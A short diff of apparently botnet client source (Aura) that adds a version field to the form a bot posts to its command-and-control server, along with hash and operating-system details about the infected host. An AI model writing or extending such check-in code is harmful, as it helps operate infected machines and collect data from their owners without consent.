@@ -154,6 +154,7 @@ void Bot::_registerBot() {
   // Register bot with C2 server
   _prepareSysInfo();
   request::PostForm postForm;
+  postForm.addField("version", AURA_VERSION);
   postForm.addField("hash_type", _hashType);
   postForm.addField("hash_sum", _hashSum);
   postForm.addField("operating_sys", _os);
